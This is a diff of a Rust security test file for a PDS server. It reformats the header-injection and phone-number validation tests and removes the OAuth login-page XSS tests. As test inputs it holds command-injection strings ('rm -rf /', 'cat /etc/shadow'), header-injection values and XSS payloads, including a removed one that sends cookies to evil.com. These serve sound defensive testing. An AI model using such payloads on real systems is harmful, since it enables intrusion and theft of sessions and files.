@@ -1,7 +1,6 @@
 mod common;
-use tranquil_pds::image::{ImageError, ImageProcessor};
 use tranquil_pds::comms::{SendError, is_valid_phone_number, sanitize_header_value};
-use tranquil_pds::oauth::templates::{error_page, login_page, success_page};
+use tranquil_pds::image::{ImageError, ImageProcessor};
 
 #[test]
 fn test_header_injection_sanitization() {
@@ -24,7 +23,11 @@ fn test_header_injection_sanitization() {
     let header_injection = "Normal Subject\r\nBcc: attacker@evil.com\r\nX-Injected: value";
     let sanitized = sanitize_header_value(header_injection);
     assert_eq!(sanitized.split("\r\n").count(), 1);
-    assert!(sanitized.contains("Normal Subject") && sanitized.contains("Bcc:") && sanitized.contains("X-Injected:"));
+    assert!(
+        sanitized.contains("Normal Subject")
+            && sanitized.contains("Bcc:")
+            && sanitized.contains("X-Injected:")
+    );
 
     let with_null = "client\0id";
     assert!(sanitize_header_value(with_null).contains("client"));
@@ -59,10 +62,21 @@ fn test_phone_number_validation() {
     assert!(!is_valid_phone_number("+1(234)567890"));
     assert!(!is_valid_phone_number("+1.234.567.890"));
 
-    for malicious in ["+123; rm -rf /", "+123 && cat /etc/passwd", "+123`id`",
-                      "+123$(whoami)", "+123|cat /etc/shadow", "+123\n--help",
-                      "+123\r\n--version", "+123--help"] {
-        assert!(!is_valid_phone_number(malicious), "Command injection '{}' should be rejected", malicious);
+    for malicious in [
+        "+123; rm -rf /",
+        "+123 && cat /etc/passwd",
+        "+123`id`",
+        "+123$(whoami)",
+        "+123|cat /etc/shadow",
+        "+123\n--help",
+        "+123\r\n--version",
+        "+123--help",
+    ] {
+        assert!(
+            !is_valid_phone_number(malicious),
+            "Command injection '{}' should be rejected",
+            malicious
+        );
     }
 }
 
@@ -88,71 +102,6 @@ fn test_image_file_size_limits() {
 }
 
 #[test]
-fn test_oauth_template_xss_protection() {
-    let html = login_page("<script>alert('xss')</script>", None, None, "test-uri", None, None);
-    assert!(!html.contains("<script>") && html.contains("&lt;script&gt;"));
-
-    let html = login_page("client123", Some("<img src=x onerror=alert('xss')>"), None, "test-uri", None, None);
-    assert!(!html.contains("<img ") && html.contains("&lt;img"));
-
-    let html = login_page("client123", None, Some("\"><script>alert('xss')</script>"), "test-uri", None, None);
-    assert!(!html.contains("<script>"));
-
-    let html = login_page("client123", None, None, "test-uri",
-        Some("<script>document.location='http://evil.com?c='+document.cookie</script>"), None);
-    assert!(!html.contains("<script>"));
-
-    let html = login_page("client123", None, None, "test-uri", None,
-        Some("\" onfocus=\"alert('xss')\" autofocus=\""));
-    assert!(!html.contains("onfocus=\"alert") && html.contains("&quot;"));
-
-    let html = login_page("client123", None, None, "\" onmouseover=\"alert('xss')\"", None, None);
-    assert!(!html.contains("onmouseover=\"alert"));
-
-    let html = error_page("<script>steal()</script>", Some("<img src=x onerror=evil()>"));
-    assert!(!html.contains("<script>") && !html.contains("<img "));
-
-    let html = success_page(Some("<script>steal_session()</script>"));
-    assert!(!html.contains("<script>"));
-
-    for (page, name) in [
-        (login_page("client", None, None, "uri", None, None), "login"),
-        (error_page("err", None), "error"),
-        (success_page(None), "success"),
-    ] {
-        assert!(!page.contains("javascript:"), "{} page has javascript: URL", name);
-    }
-
-    let html = login_page("client123", None, None, "javascript:alert('xss')//", None, None);
-    assert!(html.contains("action=\"/oauth/authorize\""));
-}
-
-#[test]
-fn test_oauth_template_html_escaping() {
-    let html = login_page("client&test", None, None, "test-uri", None, None);
-    assert!(html.contains("&amp;") && !html.contains("client&test"));
-
-    let html = login_page("client\"test'more", None, None, "test-uri", None, None);
-    assert!(html.contains("&quot;") || html.contains("&#34;"));
-    assert!(html.contains("&#39;") || html.contains("&apos;"));
-
-    let html = login_page("client<test>more", None, None, "test-uri", None, None);
-    assert!(html.contains("&lt;") && html.contains("&gt;") && !html.contains("<test>"));
-
-    let html = login_page("my-safe-client", Some("My Safe App"), Some("read write"),
-        "valid-uri", None, Some("user@example.com"));
-    assert!(html.contains("my-safe-client") || html.contains("My Safe App"));
-    assert!(html.contains("read write") || html.contains("read"));
-    assert!(html.contains("user@example.com"));
-
-    let html = login_page("client", None, None, "\" onclick=\"alert('csrf')", None, None);
-    assert!(!html.contains("onclick=\"alert"));
-
-    let html = login_page("客户端 クライアント", None, None, "test-uri", None, None);
-    assert!(html.contains("客户端") || html.contains("&#"));
-}
-
-#[test]
 fn test_send_error_display() {
     let timeout = SendError::Timeout;
     assert!(!format!("{}", timeout).is_empty());
@@ -173,16 +122,22 @@ async fn test_signup_queue_authentication() {
     let base = base_url().await;
     let http_client = client();
 
-    let res = http_client.get(format!("{}/xrpc/com.atproto.temp.checkSignupQueue", base))
-        .send().await.unwrap();
+    let res = http_client
+        .get(format!("{}/xrpc/com.atproto.temp.checkSignupQueue", base))
+        .send()
+        .await
+        .unwrap();
     assert_eq!(res.status(), reqwest::StatusCode::OK);
     let body: serde_json::Value = res.json().await.unwrap();
     assert_eq!(body["activated"], true);
 
     let (token, _did) = create_account_and_login(&http_client).await;
-    let res = http_client.get(format!("{}/xrpc/com.atproto.temp.checkSignupQueue", base))
+    let res = http_client
+        .get(format!("{}/xrpc/com.atproto.temp.checkSignupQueue", base))
         .header("Authorization", format!("Bearer {}", token))
-        .send().await.unwrap();
+        .send()
+        .await
+        .unwrap();
     assert_eq!(res.status(), reqwest::StatusCode::OK);
     let body: serde_json::Value = res.json().await.unwrap();
     assert_eq!(body["activated"], true);
